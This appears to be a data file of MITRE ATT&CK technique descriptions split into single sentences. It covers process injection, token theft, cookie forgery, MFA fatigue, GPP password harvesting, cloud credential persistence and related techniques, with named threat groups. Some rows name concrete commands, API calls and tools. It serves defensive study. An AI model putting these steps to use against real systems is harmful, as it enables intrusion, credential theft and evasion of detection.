8487,T1055,T1055.013,Process Doppelgänging,"Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext."
8488,T1055,T1055.013,Process Doppelgänging,"Process Doppelgänging is implemented in 4 steps :
* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code."
8489,T1055,T1055.013,Process Doppelgänging,These changes will be isolated and only visible within the context of the transaction.
8490,T1055,T1055.013,Process Doppelgänging,* Load – Create a shared section of memory and load the malicious executable.
8491,T1055,T1055.013,Process Doppelgänging,"* Rollback – Undo changes to original executable, effectively removing malicious code from the file system."
8492,T1055,T1055.013,Process Doppelgänging,* Animate – Create a process from the tainted section of memory and initiate execution.
8493,T1055,T1055.013,Process Doppelgänging,This behavior will likely not result in elevated privileges since the injected process was spawned from  of the injecting process.
8494,T1055,T1055.013,Process Doppelgänging,"However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process."
8495,T1055,T1055.013,Process Doppelgänging,"SynAck, abuses NTFS transactions to launch and conceal malicious processes."
8496,T1055,T1055.013,Process Doppelgänging,"Bazar, can inject into a target process using process doppelgänging."
8497,T1055,T1055.013,Process Doppelgänging,"Leafminer, has used Process Doppelgänging, to evade security software while deploying tools on compromised systems."

9541,T1055,T1055.004,Asynchronous Procedure Call,Adversaries may inject malicious code into processes via the asynchronous procedure call  queue in order to evade process-based defenses as well as possibly elevate privileges.
9542,T1055,T1055.004,Asynchronous Procedure Call,APC injection is a method of executing arbitrary code in the address space of a separate live process.
9543,T1055,T1055.004,Asynchronous Procedure Call,APC injection is commonly performed by attaching malicious code to the APC Queue  of a process's thread.
9544,T1055,T1055.004,Asynchronous Procedure Call,Queued APC functions are executed when the thread enters an alterable state.
9545,T1055,T1055.004,Asynchronous Procedure Call,At this point QueueUserAPC can be used to invoke a function .
9546,T1055,T1055.004,Asynchronous Procedure Call,"A variation of APC injection, dubbed ""Early Bird injection"", involves creating a suspended process in which malicious code can be written and executed before the process' entry point  via an APC."
9547,T1055,T1055.004,Asynchronous Procedure Call,AtomBombing  is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.
9548,T1055,T1055.004,Asynchronous Procedure Call,Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.

9560,T1020,T1020.001,Traffic Duplication,Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure.
9561,T1020,T1020.001,Traffic Duplication,"Traffic mirroring is a native feature for some devices, often used for network analysis."
9562,T1020,T1020.001,Traffic Duplication,"For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device."
9563,T1020,T1020.001,Traffic Duplication,Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control.
9564,T1020,T1020.001,Traffic Duplication,"Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit, or Patch System Image,."
9565,T1020,T1020.001,Traffic Duplication,Many cloud-based environments also support traffic mirroring.
9566,T1020,T1020.001,Traffic Duplication,"Adversaries may use traffic duplication in conjunction with Network Sniffing,, Input Capture,, or Adversary-in-the-Middle, depending on the goals and objectives of the adversary."
9567,T1138,T1138,Application Shimming,"If so, the shim database uses Hooking, to redirect the code as necessary in order to communicate with the OS."
9568,T1138,T1138,Application Shimming,"A list of all shims currently installed by the default Windows installer  is kept in:
* %WINDIR%\AppPatch\sysmain.sdb
* hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb
Custom databases are stored in:
* %WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom
* hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom
To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim."
9569,T1138,T1138,Application Shimming,"However, certain shims can be used to Bypass User Account Control,  , inject DLLs into processes , disable Data Execution Prevention  and Structure Exception Handling , and intercept memory addresses ."
9570,T1138,T1138,Application Shimming,"Similar to Hooking,, utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc."
9571,T1647,T1647,Plist File Modification,"Adversaries may modify property list files  to enable other malicious activity, while also potentially evading and bypassing system defenses."
9572,T1647,T1647,Plist File Modification,"macOS applications use plist files, such as the info.plist file, to store properties and configuration settings that inform the operating system how to handle the application at runtime."
9573,T1647,T1647,Plist File Modification,Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD.
9574,T1647,T1647,Plist File Modification,Plist files can be saved in text or binary format.
9575,T1647,T1647,Plist File Modification,"Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application  Hidden Window, or running additional commands for persistence /Launch Daemon, or Re-opened Applications,."

10066,T1606,T1606.001,Web Cookies,Adversaries may generate these cookies in order to gain access to web resources.
10067,T1606,T1606.001,Web Cookies,"This differs from Steal Web Session Cookie, and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users."
10068,T1606,T1606.001,Web Cookies,Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.
10069,T1606,T1606.001,Web Cookies,"The generation of web cookies often requires secret values, such as passwords, Private Keys,, or other cryptographic seed values."
10070,T1606,T1606.001,Web Cookies,"Once forged, adversaries may use these web cookies to access resources , which may bypass multi-factor and other authentication protection mechanisms."
10071,T1606,T1606.001,Web Cookies,"APT29, has bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key."
10072,T1606,T1606.001,Web Cookies,"UNC2452, bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key."
10073,T1654,T1654,Log Enumeration,Adversaries may enumerate system and service logs to find useful data.

10075,T1654,T1654,Log Enumeration,Host binaries may be leveraged to collect system logs.
10076,T1654,T1654,Log Enumeration,"Examples include using `wevtutil.exe` or PowerShell, on Windows to access and/or export security event information."
10077,T1654,T1654,Log Enumeration,"In cloud environments, adversaries may leverage utilities such as the Azure VM Agent’s `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure."
10078,T1654,T1654,Log Enumeration,Adversaries may also target centralized logging infrastructure such as SIEMs.
10079,T1654,T1654,Log Enumeration,Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.
10080,T1654,T1654,Log Enumeration,"APT5, has used the BLOODMINE utility to parse and extract information from Pulse Secure Connect logs."
10081,T1654,T1654,Log Enumeration,"Volt Typhoon, has used `wevtutil.exe` and the PowerShell command `Get-EventLog security` to enumerate Windows logs to search for successful logons."
10082,T1134,T1134.001,Token Impersonation/Theft,Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls.
10083,T1134,T1134.001,Token Impersonation/Theft,"For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`."
10084,T1134,T1134.001,Token Impersonation/Theft,"The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread."
10085,T1134,T1134.001,Token Impersonation/Theft,"An adversary may perform Token Impersonation/Theft, when they have a specific, existing process they want to assign the duplicated token to."
10086,T1134,T1134.001,Token Impersonation/Theft,"For example, this may be useful for when the target user has a non-network logon session on the system."
10087,T1134,T1134.001,Token Impersonation/Theft,"When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token, using `CreateProcessWithTokenW` or `CreateProcessAsUserW`."
10088,T1134,T1134.001,Token Impersonation/Theft,"Token Impersonation/Theft, is also distinct from Make and Impersonate Token, in that it refers to duplicating an existing token, rather than creating a new one."
10089,T1134,T1134.001,Token Impersonation/Theft,"FinFisher, uses token manipulation with NtFilterToken as part of UAC bypass."

10102,T1134,T1134.001,Token Impersonation/Theft,"FIN8, has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token."
10103,T1567,T1567.001,Exfiltration to Code Repository,Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel.
10104,T1567,T1567.001,Exfiltration to Code Repository,Code repositories are often accessible via an API .
10105,T1567,T1567.001,Exfiltration to Code Repository,"Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection."
10106,T1567,T1567.001,Exfiltration to Code Repository,Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.
10107,T1021,T1021.007,Cloud Services,"Adversaries may log into accessible cloud services within a compromised environment using Valid Accounts, that are synchronized with or federated to on-premises user identities."
10108,T1021,T1021.007,Cloud Services,The adversary may then perform management actions or access cloud-hosted resources as the logged-on user.
10109,T1021,T1021.007,Cloud Services,"Many enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane."
10110,T1021,T1021.007,Cloud Services,"Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface  , using commands such as Connect-AZAccount for Azure PowerShell, Connect-MgGraph for Microsoft Graph PowerShell, and gcloud auth login for the Google Cloud CLI."
10111,T1021,T1021.007,Cloud Services,"In some cases, adversaries may be able to authenticate to these services via Application Access Token, instead of a username and password."

10115,T1205,T1205.001,Port Knocking,Adversaries may use port knocking to hide open ports used for persistence or command and control.
10116,T1205,T1205.001,Port Knocking,"To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports."
10117,T1205,T1205.001,Port Knocking,"After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software."
10118,T1205,T1205.001,Port Knocking,This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.
10119,T1205,T1205.001,Port Knocking,"Mafalda, can use port-knocking to authenticate itself to another implant called Cryshell to establish an indirect connection to the C2 server."
10120,T1205,T1205.001,Port Knocking,"metaMain, has authenticated itself to a different implant, Cryshell, through a port knocking and handshake procedure."
10121,T1205,T1205.001,Port Knocking,"PROMETHIUM, has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports."
10122,T1027,T1027.012,LNK Icon Smuggling,Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files.
10123,T1027,T1027.012,LNK Icon Smuggling,"Windows shortcut files  include many metadata fields, including an icon location field  designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory."
10124,T1027,T1027.012,LNK Icon Smuggling,Adversaries may abuse this LNK metadata to download malicious payloads.
10125,T1027,T1027.012,LNK Icon Smuggling,"For example, adversaries have been observed using LNK files as phishing payloads to deliver malware."
10126,T1027,T1027.012,LNK Icon Smuggling,"Once invoked , payloads referenced via external URLs within the LNK icon location field may be downloaded."
10127,T1027,T1027.012,LNK Icon Smuggling,"These files may also then be invoked by Command and Scripting Interpreter,/System Binary Proxy Execution, arguments within the target path field of the LNK."
10128,T1027,T1027.012,LNK Icon Smuggling,"LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads."
10129,T1583,T1583.006,Web Services,Adversaries may register for web services that can be used during targeting.
10130,T1583,T1583.006,Web Services,"A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control , Exfiltration Over Web Service,, or Phishing,."
10131,T1583,T1583.006,Web Services,"By utilizing a web service, adversaries can make it difficult to physically tie back operations to them."

10151,T1528,T1528,Steal Application Access Token,Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.
10152,T1528,T1528,Steal Application Access Token,Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service .
10153,T1528,T1528,Steal Application Access Token,"Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment."
10154,T1528,T1528,Steal Application Access Token,"For example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens."
10155,T1528,T1528,Steal Application Access Token,"If a container is compromised, an adversary may be able to steal the container’s token and thereby gain access to Kubernetes API commands."
10156,T1528,T1528,Steal Application Access Token,"Similarly, instances within continuous-development / continuous-integration  pipelines will often use API tokens to authenticate to other services for testing and deployment."
10157,T1528,T1528,Steal Application Access Token,"If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges."
10158,T1528,T1528,Steal Application Access Token,"Token theft can also occur through social engineering, in which case user action may be required to grant access."
10159,T1528,T1528,Steal Application Access Token,An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols.
10160,T1528,T1528,Steal Application Access Token,An example commonly-used sequence is Microsoft's Authorization Code Grant flow.
10161,T1528,T1528,Steal Application Access Token,An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials.
10162,T1528,T1528,Steal Application Access Token,Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.
10163,T1528,T1528,Steal Application Access Token,"The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls."
10164,T1528,T1528,Steal Application Access Token,"Then, they can send a Spearphishing Link, to the target user to entice them to grant access to the application."
10165,T1528,T1528,Steal Application Access Token,"Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through Application Access Token,."
10166,T1528,T1528,Steal Application Access Token,"Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token."
10167,T1528,T1528,Steal Application Access Token,"However, in some cases, adversaries can also steal application refresh tokens, allowing them to obtain new access tokens without prompting the user."
10168,T1528,T1528,Steal Application Access Token,"APT29, uses stolen tokens to access victim accounts, without needing a password."
10169,T1528,T1528,Steal Application Access Token,"APT28, has used several malicious applications to steal user OAuth access tokens including applications masquerading as ""Google Defender"" ""Google Email Protection,"" and ""Google Scanner"" for Gmail users."
10170,T1528,T1528,Steal Application Access Token,"They also targeted Yahoo users with applications masquerading as ""Delivery Service"" and ""McAfee Email Protection""."
10171,T1598,T1598.002,Spearphishing Attachment,Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting.
10172,T1598,T1598.002,Spearphishing Attachment,"In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file."
10173,T1598,T1598.002,Spearphishing Attachment,"The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate."
10174,T1598,T1598.002,Spearphishing Attachment,"Dragonfly, has used spearphishing with Microsoft Office attachments to enable harvesting of user credentials."
10175,T1598,T1598.002,Spearphishing Attachment,"Sidewinder, has sent e-mails with malicious attachments that lead victims to credential harvesting websites."
10176,T1598,T1598.002,Spearphishing Attachment,"SideCopy, has crafted generic lures for spam campaigns to collect emails and credentials for targeting efforts."
10177,T1098,T1098.001,Additional Cloud Credentials,Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.
10178,T1098,T1098.001,Additional Cloud Credentials,"For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD."
10179,T1098,T1098.001,Additional Cloud Credentials,These credentials include both x509 keys and passwords.
10180,T1098,T1098.001,Additional Cloud Credentials,"With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules."
10181,T1098,T1098.001,Additional Cloud Credentials,"In infrastructure-as-a-service  environments, after gaining access through Cloud Accounts,, adversaries may generate or import their own SSH keys using either the CreateKeyPair or ImportKeyPair API in AWS or the gcloud compute os-login ssh-keys add command in GCP."
10182,T1098,T1098.001,Additional Cloud Credentials,This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.
10183,T1098,T1098.001,Additional Cloud Credentials,Adversaries may also use the CreateAccessKey API in AWS or the gcloud iam service-accounts keys create command in GCP to add access keys to an account.
10184,T1098,T1098.001,Additional Cloud Credentials,"If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment  Cloud Accounts,."
10185,T1098,T1098.001,Additional Cloud Credentials,"For example, in Azure AD environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal."
10186,T1098,T1098.001,Additional Cloud Credentials,"In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator."
10187,T1098,T1098.001,Additional Cloud Credentials,"In AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to Forge Web Credentials, tied to the permissions of the original user account."
10188,T1098,T1098.001,Additional Cloud Credentials,These temporary credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.
10189,T1098,T1098.001,Additional Cloud Credentials,"APT29, has added credentials to OAuth Applications and Service Principals."
10190,T1098,T1098.001,Additional Cloud Credentials,"UNC2452, added credentials to OAuth Applications and Service Principals."
10191,T1204,T1204,User Execution,An adversary may rely upon specific actions by a user in order to gain execution.
10192,T1204,T1204,User Execution,"Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link."
10193,T1204,T1204,User Execution,"These user actions will typically be observed as follow-on behavior from forms of Phishing,."
10194,T1204,T1204,User Execution,"While User Execution, frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it."
10195,T1204,T1204,User Execution,"Adversaries may also deceive users into performing actions such as enabling Remote Access Software,, allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to Steal Web Session Cookie,s; or downloading and executing malware for User Execution,."
10196,T1204,T1204,User Execution,"For example, tech support scams can be facilitated through Phishing,, vishing, or various forms of user interaction."
10197,T1204,T1204,User Execution,"Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or Remote Access Software,."
10198,T1204,T1204,User Execution,"Scattered Spider, has impersonated organization IT and helpdesk staff to instruct victims to execute commercial remote access tools to gain initial access."
10199,T1204,T1204,User Execution,"LAPSUS$, has recruited target organization employees or contractors who provide credentials and approve an associated MFA prompt, or install remote management software onto a corporate workstation, allowing LAPSUS$, to take control of an authenticated system."
10200,T1204,T1204,User Execution,"Magic Hound, has attempted to get users to execute malware via social media and spearphishing emails."
10201,T1491,T1491.001,Internal Defacement,"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems."
10202,T1491,T1491.001,Internal Defacement,"This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper."
10203,T1491,T1491.001,Internal Defacement,"Disturbing or offensive images may be used as a part of Internal Defacement, in order to cause user discomfort, or to pressure compliance with accompanying messages."
10204,T1491,T1491.001,Internal Defacement,"Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished."
10205,T1491,T1491.001,Internal Defacement,"Black Basta, has set the desktop wallpaper on victims' machines to display a ransom note."
10206,T1491,T1491.001,Internal Defacement,"After encryption, Diavol, will capture the desktop background window, set the background color to black, and change the desktop wallpaper to a newly created bitmap image with the text “All your files are encrypted!"

10230,T1134,T1134.003,Make and Impersonate Token,Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls.
10231,T1134,T1134.003,Make and Impersonate Token,"For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function."
10232,T1134,T1134.003,Make and Impersonate Token,The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.
10233,T1134,T1134.003,Make and Impersonate Token,"This behavior is distinct from Token Impersonation/Theft, in that this refers to creating a new user token instead of stealing or duplicating an existing one."
10234,T1134,T1134.003,Make and Impersonate Token,"Mafalda, can create a token for a different user."
10235,T1134,T1134.003,Make and Impersonate Token,"Cobalt Strike, can make tokens from known credentials."

10239,T1552,T1552.006,Group Policy Preferences,These policies allow administrators to set local accounts.
10240,T1552,T1552.006,Group Policy Preferences,These group policies are stored in SYSVOL on a domain controller.
10241,T1552,T1552.006,Group Policy Preferences,This means that any domain user can view the SYSVOL share and decrypt the password .
10242,T1552,T1552.006,Group Policy Preferences,"The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:
* Metasploit’s post exploitation module: post/windows/gather/credentials/gpp
* Get-GPPPassword
* gpprefdecrypt.py
On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: dir /s * .xml

10248,T1048,T1048.002,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel.
10249,T1048,T1048.002,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,Asymmetric encryption algorithms are those that use different keys on each end of the channel.
10250,T1048,T1048.002,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,"Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key."
10251,T1048,T1048.002,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,Each end of the communication channels requires a private key  and the public key of the other entity.
10252,T1048,T1048.002,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,The public keys of each entity are exchanged before encrypted communications begin.
10253,T1048,T1048.002,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,Network protocols that use asymmetric encryption  often utilize symmetric encryption once keys are exchanged.
10254,T1048,T1048.002,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.

10589,T1596,T1596.004,CDNs,"Information from these sources may reveal opportunities for other forms of reconnaissance  or Search Open Websites/Domains,, establishing operational resources  or Compromise Infrastructure,, and/or initial access ."
10590,T1497,T1497.002,User Activity Based Checks,Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments.
10591,T1497,T1497.002,User Activity Based Checks,"Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop."
10592,T1497,T1497.002,User Activity Based Checks,"Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  or waiting for a user to double click on an embedded image to activate."
10593,T1497,T1497.002,User Activity Based Checks,"Okrum, loader only executes the payload after the left mouse button has been pressed at least three times, in order to avoid being executed within virtualized or emulated environments."

10597,T1141,T1141,Input Prompt,"When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task ."
10598,T1141,T1141,Input Prompt,"Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite."
10599,T1141,T1141,Input Prompt,"This type of prompt can be used to collect credentials via various languages such as AppleScript, and PowerShell,."
10600,T1141,T1141,Input Prompt,"An attacker leverages a tool, device, or program to obtain specific information as provided by a user of the target system."
10601,T1141,T1141,Input Prompt,This information is often needed by the attacker to launch a follow-on attack.
10602,T1141,T1141,Input Prompt,This attack is different than Social Engineering as the adversary is not tricking or deceiving the user.
10603,T1141,T1141,Input Prompt,Instead the adversary is putting a mechanism in place that captures the information that a user legitimately enters into a system.
10604,T1141,T1141,Input Prompt,"Deploying a keylogger, performing a UAC prompt, or wrapping the Windows default credential provider are all examples of such interactions."
10605,T1585,T1585.003,Cloud Accounts,Adversaries may create accounts with cloud providers that can be used during targeting.
10606,T1585,T1585.003,Cloud Accounts,"Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage, or to Upload Tool,s."
10607,T1585,T1585.003,Cloud Accounts,Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.
10608,T1585,T1585.003,Cloud Accounts,"Creating Cloud Accounts, may also require adversaries to establish Email Accounts, to register with the cloud provider."
10609,T1072,T1072,Software Deployment Tools,Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network.
10610,T1072,T1072,Software Deployment Tools,Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes.
10611,T1072,T1072,Software Deployment Tools,These systems may also be integrated into CI/CD pipelines.
10612,T1072,T1072,Software Deployment Tools,"Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager."
10613,T1072,T1072,Software Deployment Tools,Access to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems.
10614,T1072,T1072,Software Deployment Tools,"The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints."
10615,T1072,T1072,Software Deployment Tools,"SaaS-based configuration management services may allow for broad Cloud Administration Command, on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints."
10616,T1072,T1072,Software Deployment Tools,"For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Azure AD."
10617,T1072,T1072,Software Deployment Tools,"Such services may also utilize Web Protocols, to communicate back to adversary owned infrastructure."
10618,T1072,T1072,Software Deployment Tools,Network infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.
10619,T1072,T1072,Software Deployment Tools,"The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required."
10620,T1072,T1072,Software Deployment Tools,"However, the system may require an administrative account to log in or to access specific functionality."
10621,T1072,T1072,Software Deployment Tools,"It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the Wiper, malware."
10622,T1072,T1072,Software Deployment Tools,"APT32, compromised McAfee ePO to move laterally by distributing malware as a software deployment task."

10767,T1134,T1134.004,Parent PID Spoofing,Adversaries may spoof the parent process identifier  of a new process to evade process-monitoring defenses or to elevate privileges.
10768,T1134,T1134.004,Parent PID Spoofing,"New processes are typically spawned directly from their parent, or calling, process unless explicitly specified."
10769,T1134,T1134.004,Parent PID Spoofing,"One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use."
10770,T1134,T1134.004,Parent PID Spoofing,This functionality is used by Windows features such as User Account Control  to correctly set the PPID after a requested elevated process is spawned by SYSTEM  rather than the current user context.
10771,T1134,T1134.004,Parent PID Spoofing,"Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell,/Rundll32, to be explorer.exe rather than an Office document delivered as part of Spearphishing Attachment,."
10772,T1134,T1134.004,Parent PID Spoofing,"This spoofing could be executed via Visual Basic, within a malicious Office document or any code that can perform Native API,."
10773,T1134,T1134.004,Parent PID Spoofing,Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process.
10774,T1134,T1134.004,Parent PID Spoofing,"For example, an adversary in a privileged user context  administrator may spawn a new process and assign the parent as a process running as SYSTEM , causing the new process to be elevated via the inherited access token."

10806,T1606,T1606,Forge Web Credentials,"This differs from Steal Web Session Cookie,, Steal Application Access Token,, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users."
10807,T1606,T1606,Forge Web Credentials,"The generation of web credentials often requires secret values, such as passwords, Private Keys,, or other cryptographic seed values."
10808,T1606,T1606,Forge Web Credentials,"Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials , Temporary Elevated Cloud Access,, or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain."
10809,T1606,T1606,Forge Web Credentials,"Once forged, adversaries may use these web credentials to access resources , which may bypass multi-factor and other authentication protection mechanisms."
10810,T1621,T1621,Multi-Factor Authentication Request Generation,Adversaries may attempt to bypass multi-factor authentication  mechanisms and gain access to accounts by generating MFA requests sent to users.
10811,T1621,T1621,Multi-Factor Authentication Request Generation,"Adversaries in possession of credentials to Valid Accounts, may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control."
10812,T1621,T1621,Multi-Factor Authentication Request Generation,"To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account."
10813,T1621,T1621,Multi-Factor Authentication Request Generation,"If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset ."
10814,T1621,T1621,Multi-Factor Authentication Request Generation,"In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to “MFA fatigue.” APT29, has used repeated MFA requests to gain access to victim accounts."
10815,T1621,T1621,Multi-Factor Authentication Request Generation,"Scattered Spider, has used multifactor authentication  fatigue by sending repeated MFA authentication requests to targets."

11042,T1055,T1055.014,VDSO Hijacking,Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges.
11043,T1055,T1055.014,VDSO Hijacking,Virtual dynamic shared object  hijacking is a method of executing arbitrary code in the address space of a separate live process.
11044,T1055,T1055.014,VDSO Hijacking,VDSO hijacking involves redirecting calls to dynamically linked shared libraries.
11045,T1055,T1055.014,VDSO Hijacking,"Memory protections may prevent writing executable code to a process via Ptrace System Calls,."
11046,T1055,T1055.014,VDSO Hijacking,"However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object."
11047,T1055,T1055.014,VDSO Hijacking,This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table .
11048,T1055,T1055.014,VDSO Hijacking,Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.
11049,T1071,T1071.002,File Transfer Protocols,Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic.

11073,T1122,T1122,Component Object Model Hijacking,The Component Object Model  is a system within Windows to enable interaction between software components through the operating system.
11074,T1122,T1122,Component Object Model Hijacking,Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence.
11075,T1122,T1122,Component Object Model Hijacking,Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed.
